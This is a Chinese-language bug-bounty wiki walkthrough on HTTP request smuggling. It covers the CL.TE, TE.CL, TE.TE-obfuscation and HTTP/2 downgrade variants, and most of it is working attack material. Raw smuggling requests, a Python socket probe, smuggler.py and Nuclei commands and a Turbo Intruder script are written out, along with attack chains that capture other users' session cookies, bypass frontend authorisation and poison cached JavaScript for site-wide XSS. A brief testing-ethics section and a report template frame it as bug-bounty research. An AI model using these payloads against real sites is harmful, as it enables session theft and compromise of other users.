---
type: wiki
category: attack
tool: burp,smuggler
status: active
last-updated: 2026-04-21
---

# HTTP Request Smuggling Walkthrough

> **用途：** 大多數現代網站都有 frontend (CDN/LB/WAF) → backend。兩邊解析 Content-Length / Transfer-Encoding 不一致就能 smuggle。
> PortSwigger / HackerOne 大獎高頻類別，P1-P2 常見（cache poisoning / auth bypass / admin request steal）。

## 0. 核心原理

HTTP/1.1 用兩種方式決定 request body 長度：

```
Content-Length: 12     ← 正常（CL）
Transfer-Encoding: chunked  ← 分塊（TE）
```

Frontend 用 CL、backend 用 TE（或反之）→ 攻擊者在一個 request 藏第二個，backend 把藏的當作「下一個 user 的 request 起頭」。

### 四種基本變體

| 變體 | 前端 | 後端 | 常見場景 |
|------|------|------|---------|
| **CL.TE** | CL | TE | AWS ALB + backend 支援 TE |
| **TE.CL** | TE | CL | nginx + Apache Tomcat |
| **TE.TE** | TE（混淆）| TE | 透過 obfuscation（`Transfer-Encoding: xchunked`）|
| **H2.CL / H2.TE** | HTTP/2 | HTTP/1.1（帶 CL/TE 指令）| Cloudflare / Akamai HTTP/2 前端 |

## 1. 偵測（時間差法）

### 手動（curl + python）

```python
# CL.TE 偵測 — 若後端讀 TE，會等不到下一個 chunk 而 timeout
import socket
payload = (
    "POST / HTTP/1.1\r\n"
    "Host: target.com\r\n"
    "Content-Length: 4\r\n"
    "Transfer-Encoding: chunked\r\n"
    "\r\n"
    "1\r\n"
    "A\r\n"
    "X"    # 故意多寫 X，後端若認 CL=4 → 讀完停，若認 TE → 卡住等 chunk 終止
)
s = socket.create_connection(("target.com", 443))
s.sendall(payload.encode())
```

若 frontend timeout < backend：backend 卡住 → 長 delay → smuggling 可能存在。

### 自動：smuggler.py

```bash
# https://github.com/defparam/smuggler
git clone https://github.com/defparam/smuggler
cd smuggler

# 基本掃
python3 smuggler.py -u https://target.com --test all

# 只測 CL.TE
python3 smuggler.py -u https://target.com --test basic

# 自訂 request file
python3 smuggler.py -u https://target.com -r request.txt
```

### 自動：Burp HTTP Request Smuggler（JS, ActiveScan++）

Burp Store → 裝 "HTTP Request Smuggler" → 右鍵 target → `Smuggle probe` → 看 Issues。

### Nuclei（粗糙）

```bash
nuclei -u https://target.com -t http/vulnerabilities/generic/http-desync.yaml
# 誤報率高，建議用 smuggler.py 驗證
```

## 2. CL.TE Smuggling（Frontend 用 CL / Backend 用 TE）

```http
POST / HTTP/1.1
Host: target.com
Content-Length: 13
Transfer-Encoding: chunked

0

SMUGGLED
```

**解析：**
- Frontend 讀 `Content-Length: 13` → 把整個 body（13 bytes 含 `0\r\n\r\nSMUGGLED`）當一個 request 送後端
- Backend 讀 `Transfer-Encoding: chunked` → `0\r\n\r\n` = chunk 結束 → 第一 request 結束
- `SMUGGLED` 留在 socket buffer → 變成**下一個 user 的 request 開頭**

### 實戰：偷 admin 的 request

```http
POST /search HTTP/1.1
Host: target.com
Content-Length: 165
Transfer-Encoding: chunked

0

GET /admin HTTP/1.1
Host: target.com
X-Ignore: X
```

下一個使用者（可能是 admin）發 request 時，backend 會把他的 request line **接在我們的 `X-Ignore: X` 後**，整個變成：

```
GET /admin HTTP/1.1
Host: target.com
X-Ignore: XGET / HTTP/1.1   ← admin 真正的 request 被塞在這裡
Cookie: session=ADMIN_TOKEN
...
```

→ 我們的 request 送到 `/admin` + 帶 admin cookie → 回應 admin page 給我們。

## 3. TE.CL Smuggling（反過來）

```http
POST / HTTP/1.1
Host: target.com
Content-Length: 3
Transfer-Encoding: chunked

8
SMUGGLED
0

```

- Frontend TE → 讀 `8\r\nSMUGGLED\r\n0\r\n\r\n`（完整 chunks）→ 全部當一個 request
- Backend CL=3 → 只讀 `8\r\n`（3 bytes）→ 剩下 `SMUGGLED\r\n0\r\n\r\n` 留 buffer → 下個 user

## 4. TE.TE（obfuscation）

Frontend 不辨識異常 TE header，後端辨識 → 一邊用 CL 一邊用 TE。

```http
Transfer-Encoding: xchunked
Transfer-Encoding : chunked
Transfer-Encoding: chunked
  Transfer-Encoding: chunked
Transfer-Encoding: chunked\x20
Transfer-Encoding:[tab]chunked
X-Transfer-Encoding: chunked
Transfer-Encoding: chunked\r\nX: X
Transfer-Encoding:\n chunked
```

smuggler.py 的 `--test all` 會自動試 40+ 種 obfuscation。

## 5. HTTP/2 Downgrade（現代主流）

HTTP/2 不用 CL/TE，用 binary frame。但很多 CDN/LB 把 HTTP/2 **downgrade** 到 HTTP/1.1 給 backend。攻擊者在 HTTP/2 的 header 偷塞 CL/TE，downgrade 後就變有效。

### H2.CL

```
# HTTP/2 request (用 curl --http2-prior-knowledge 或 nghttp2)
:method POST
:path /
:authority target.com
content-length 0    ← 注意：HTTP/2 content-length 是 header，但 pseudo-header 才是正式 body 邊界

GET /admin HTTP/1.1
Host: target.com
```

Frontend HTTP/2 沒看 content-length（因為 HTTP/2 用 frame 長度）→ body 全送。
Downgrade 時把 `content-length: 0` 寫到 HTTP/1.1 header → backend 讀 CL=0，之後的 `GET /admin` 是新 request。

### H2.TE

```
:method POST
:path /
:authority target.com
transfer-encoding chunked

0

GET /admin HTTP/1.1
```

### 工具

- **Burp HTTP/2 message view**（Options → HTTP → "Allow HTTP/2 ALPN override"）
- **smuggler.py with --http2**
- **h2csmuggler**: https://github.com/BishopFox/h2csmuggler

## 6. 實戰攻擊鏈

### 6.1 Capture admin request → Steal cookie

```http
POST /abc HTTP/1.1
Host: target.com
Content-Length: 400
Transfer-Encoding: chunked

0

POST /log HTTP/1.1
Host: target.com
Content-Type: application/x-www-form-urlencoded
Content-Length: 300

data=
```

下一個 user 的 request 被塞到 `data=` 後面 → server 把整個寫到 `/log`（可能是 comment function、profile 等攻擊者可讀的地方）→ 看到他的 cookie。

### 6.2 Bypass frontend security（X-Forwarded-For / auth）

Frontend 根據 URL 判斷 auth，backend 卻收到 smuggled 的 `/admin` → bypass。

```http
POST /api/public HTTP/1.1
Host: target.com
Content-Length: 55
Transfer-Encoding: chunked

0

GET /api/admin/users HTTP/1.1
X-Foo: x
```

### 6.3 Cache Poisoning（超強）

把 smuggled request 的 response 寫進「下一個 victim 的 request path」的 cache。

```http
POST / HTTP/1.1
Host: target.com
Content-Length: 130
Transfer-Encoding: chunked

0

GET /js/app.js HTTP/1.1
Host: target.com
User-Agent: attacker
X-Bypass: 1
```

Backend 回 `/js/app.js` 的 response → frontend cache 把它貼到 victim 的 `/js/app.js` → 所有使用者 JS 被替換 → 全站 XSS。

## 7. 安全測試守則

1. ✅ **先用時間差法偵測**（不會汙染）
2. ✅ **用自己的 session cookie 測 smuggled request**（不影響他人）
3. ❌ **不在高流量時間測**（victim request 可能被你改路徑）
4. ❌ **不做 stored impact**（如 cache poison 全站 js）
5. ✅ **測完立即停止連線**（close 避免 leftover buffer 影響 pool）

## 8. PoC 完整流程（Burp）

### Step 1: 偵測
```
1. Proxy a normal request to target
2. Extensions → HTTP Request Smuggler → Launch smuggle probe
3. Wait for scan → Issues tab 看 "Possible smuggling"
```

### Step 2: 驗證（Turbo Intruder）
```python
def queueRequests(target, wordlists):
    engine = RequestEngine(
        endpoint=target.endpoint,
        concurrentConnections=1,
        requestsPerConnection=100,
        pipeline=False
    )
    # 故意 smuggle
    smuggle = '''POST / HTTP/1.1
Host: target.com
Content-Length: 13
Transfer-Encoding: chunked

0

GET /admin HTTP/1.1
X: X'''
    engine.queue(smuggle)
    # 立即送一個正常 request → 看是否被 smuggle 影響
    engine.queue(target.req)

def handleResponse(req, interesting):
    table.add(req)
```

### Step 3: 報告

包含：
- 精確的 CL/TE variant
- 完整 raw HTTP request
- 時間差證明（delay timing）
- 驗證 PoC（用自己的帳號展示 admin route access 或 request capture）
- 建議修補（frontend/backend 同步 HTTP parser）

## 9. Nuclei 快篩 template

```yaml
id: http-smuggle-desync-test
info:
  name: HTTP Smuggling Time-based Detect
  severity: info
  author: hunter

http:
  - raw:
      - |+
        POST / HTTP/1.1
        Host: {{Hostname}}
        Content-Length: 4
        Transfer-Encoding: chunked

        1
        A
        X

    unsafe: true
    read-all: false
    matchers:
      - type: dsl
        dsl:
          - "duration >= 10"
```

## 10. 報告 template

```markdown
## 漏洞概述
https://target.com 的 CDN (Cloudflare) 與 backend (Spring Boot) 對 Transfer-Encoding
解析不一致，可透過 CL.TE smuggling 偷取下一位使用者的 session cookie。

## 偵測
smuggler.py -u https://target.com --test basic
→ CL.TE Vulnerable

## PoC
[raw HTTP request]

Delay 驗證：
time { curl ... }
→ 正常: 150ms / smuggle: 30s

## Impact
- 可偷取任一使用者的 session cookie
- 可 cache poison /js/app.js → 全站 stored XSS

## Severity
P1 / Critical
```

## 關聯文件

- [01-waf-bypass-playbook.md](01-waf-bypass-playbook.md) — WAF 後站攻擊面
- [64-cache-poisoning.md](64-cache-poisoning.md) — smuggling 的常見 impact 之一
- PortSwigger HTTP Desync Lab：https://portswigger.net/web-security/request-smuggling
- smuggler.py：https://github.com/defparam/smuggler
- h2csmuggler：https://github.com/BishopFox/h2csmuggler
